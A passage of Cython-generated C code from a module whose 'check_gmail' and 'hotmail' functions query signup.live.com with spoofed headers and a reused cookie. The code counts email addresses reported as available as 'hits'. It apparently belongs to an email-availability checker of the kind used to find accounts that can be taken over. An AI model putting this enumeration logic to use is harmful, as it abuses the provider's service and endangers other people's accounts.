            __Pyx_GOTREF(__pyx_t_7);
            index = 1; __pyx_t_6 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_6)) goto __pyx_L22_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_6);
            if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_16), 2) < 0) __PYX_ERR(0, 499, __pyx_L3_error)
            __pyx_t_17 = NULL;
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            goto __pyx_L23_unpacking_done;
            __pyx_L22_unpacking_failed:;
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_17 = NULL;
            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
            __PYX_ERR(0, 499, __pyx_L3_error)
            __pyx_L23_unpacking_done:;
          }
          __pyx_v_username = __pyx_t_7;
          __pyx_t_7 = 0;
          __pyx_v_gg = __pyx_t_6;
          __pyx_t_6 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_InfoAcc); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 500, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_7 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_6)) {
            PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 500, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
            PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 500, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          {
            __pyx_t_16 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 500, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            if (__pyx_t_7) {
              __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_t_7); __pyx_t_7 = NULL;
            }
            __Pyx_INCREF(__pyx_v_username);
            __Pyx_GIVEREF(__pyx_v_username);
            PyTuple_SET_ITEM(__pyx_t_16, 0+__pyx_t_13, __pyx_v_username);
            __Pyx_INCREF(__pyx_v_gg);
            __Pyx_GIVEREF(__pyx_v_gg);
            PyTuple_SET_ITEM(__pyx_t_16, 1+__pyx_t_13, __pyx_v_gg);
            __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_16, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 500, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          }
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

          
          goto __pyx_L21;
        }

        
        /*else*/ {
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_email, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 502, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_16 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_12 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_16, __pyx_kp_u__31) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u__31);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 502, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if ((likely(PyTuple_CheckExact(__pyx_t_12))) || (PyList_CheckExact(__pyx_t_12))) {
            PyObject* sequence = __pyx_t_12;
            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
            if (unlikely(size != 2)) {
              if (size > 2) __Pyx_RaiseTooManyValuesError(2);
              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
              __PYX_ERR(0, 502, __pyx_L3_error)
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            if (likely(PyTuple_CheckExact(sequence))) {
              __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
              __pyx_t_16 = PyTuple_GET_ITEM(sequence, 1); 
            } else {
              __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
              __pyx_t_16 = PyList_GET_ITEM(sequence, 1); 
            }
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_16);
            #else
            __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 502, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_16 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 502, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            #endif
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else {
            Py_ssize_t index = -1;
            __pyx_t_7 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 502, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __pyx_t_17 = Py_TYPE(__pyx_t_7)->tp_iternext;
            index = 0; __pyx_t_6 = __pyx_t_17(__pyx_t_7); if (unlikely(!__pyx_t_6)) goto __pyx_L24_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_6);
            index = 1; __pyx_t_16 = __pyx_t_17(__pyx_t_7); if (unlikely(!__pyx_t_16)) goto __pyx_L24_unpacking_failed;
            __Pyx_GOTREF(__pyx_t_16);
            if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_7), 2) < 0) __PYX_ERR(0, 502, __pyx_L3_error)
            __pyx_t_17 = NULL;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            goto __pyx_L25_unpacking_done;
            __pyx_L24_unpacking_failed:;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_17 = NULL;
            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
            __PYX_ERR(0, 502, __pyx_L3_error)
            __pyx_L25_unpacking_done:;
          }
          __pyx_v_username = __pyx_t_6;
          __pyx_t_6 = 0;
          __pyx_v_gg = __pyx_t_16;
          __pyx_t_16 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_InfoAcc); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 503, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_6 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_16)) {
            PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 503, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_16)) {
            PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_v_username, __pyx_v_gg};
            __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 503, __pyx_L3_error)
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GOTREF(__pyx_t_12);
          } else
          #endif
          {
            __pyx_t_7 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 503, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            if (__pyx_t_6) {
              __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_6); __pyx_t_6 = NULL;
            }
            __Pyx_INCREF(__pyx_v_username);
            __Pyx_GIVEREF(__pyx_v_username);
            PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_13, __pyx_v_username);
            __Pyx_INCREF(__pyx_v_gg);
            __Pyx_GIVEREF(__pyx_v_gg);
            PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_13, __pyx_v_gg);
            __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_16, __pyx_t_7, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 503, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          }
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_L21:;

        
        goto __pyx_L20;
      }

      
      /*else*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_bademail); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_16 = __Pyx_PyInt_AddObjC(__pyx_t_12, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_bademail, __pyx_t_16) < 0) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_pppp); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 506, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
          }
        }
        __pyx_t_16 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 506, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
      }
      __pyx_L20:;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_13) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_AddTraceback("source.check_gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_o);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_ok);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_gg);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_15hotmail(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_15hotmail = {"hotmail", (PyCFunction)__pyx_pw_6source_15hotmail, METH_O, 0};
static PyObject *__pyx_pw_6source_15hotmail(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("hotmail (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_14hotmail(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_14hotmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_json_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_gg = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *(*__pyx_t_7)(PyObject *);
  int __pyx_t_8;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("hotmail", 0);

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 514, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_amsc); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 514, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_amsc, __pyx_t_2) < 0) __PYX_ERR(0, 514, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_cookies = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 518, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_canary); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 518, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_canary, __pyx_t_2) < 0) __PYX_ERR(0, 518, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_origin, __pyx_kp_u_https_signup_live_com) < 0) __PYX_ERR(0, 518, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_referer, __pyx_kp_u_https_signup_live_com_signup_lic) < 0) __PYX_ERR(0, 518, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Linux_Android_10_K_A) < 0) __PYX_ERR(0, 518, __pyx_L1_error)
  __pyx_v_headers = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 525, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_signInName, __pyx_v_email) < 0) __PYX_ERR(0, 525, __pyx_L1_error)
  __pyx_v_json_data = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 528, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 528, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 530, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 530, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 530, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_json, __pyx_v_json_data) < 0) __PYX_ERR(0, 530, __pyx_L1_error)

  
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__34, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 528, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 533, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_response = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_isAvailable_true, __pyx_v_response, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 535, __pyx_L1_error)
  __pyx_t_5 = (__pyx_t_4 != 0);
  if (__pyx_t_5) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_hits); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 536, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 536, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_hits, __pyx_t_3) < 0) __PYX_ERR(0, 536, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_pppp); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 537, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 537, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_email, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 538, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_kp_u__31) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u__31);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 538, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if ((likely(PyTuple_CheckExact(__pyx_t_3))) || (PyList_CheckExact(__pyx_t_3))) {
      PyObject* sequence = __pyx_t_3;
      Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
      if (unlikely(size != 2)) {
        if (size > 2) __Pyx_RaiseTooManyValuesError(2);
        else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
        __PYX_ERR(0, 538, __pyx_L1_error)
      }
      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
      if (likely(PyTuple_CheckExact(sequence))) {
        __pyx_t_1 = PyTuple_GET_ITEM(sequence, 0); 
        __pyx_t_2 = PyTuple_GET_ITEM(sequence, 1); 
      } else {
        __pyx_t_1 = PyList_GET_ITEM(sequence, 0); 
        __pyx_t_2 = PyList_GET_ITEM(sequence, 1); 
      }
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      #else
      __pyx_t_1 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 538, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_2 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 538, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      #endif
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    } else {
      Py_ssize_t index = -1;
      __pyx_t_6 = PyObject_GetIter(__pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 538, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_7 = Py_TYPE(__pyx_t_6)->tp_iternext;
      index = 0; __pyx_t_1 = __pyx_t_7(__pyx_t_6); if (unlikely(!__pyx_t_1)) goto __pyx_L4_unpacking_failed;
      __Pyx_GOTREF(__pyx_t_1);
      index = 1; __pyx_t_2 = __pyx_t_7(__pyx_t_6); if (unlikely(!__pyx_t_2)) goto __pyx_L4_unpacking_failed;
      __Pyx_GOTREF(__pyx_t_2);
      if (__Pyx_IternextUnpackEndCheck(__pyx_t_7(__pyx_t_6), 2) < 0) __PYX_ERR(0, 538, __pyx_L1_error)
      __pyx_t_7 = NULL;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      goto __pyx_L5_unpacking_done;
      __pyx_L4_unpacking_failed:;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_7 = NULL;
      if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
      __PYX_ERR(0, 538, __pyx_L1_error)
      __pyx_L5_unpacking_done:;
    }
    __pyx_v_username = __pyx_t_1;
    __pyx_t_1 = 0;
    __pyx_v_gg = __pyx_t_2;
    __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_InfoAcc); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 539, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = NULL;
    __pyx_t_8 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_1)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_1);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_8 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_2)) {
      PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_v_username, __pyx_v_gg};
      __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 539, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_GOTREF(__pyx_t_3);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
      PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_v_username, __pyx_v_gg};
      __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 539, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
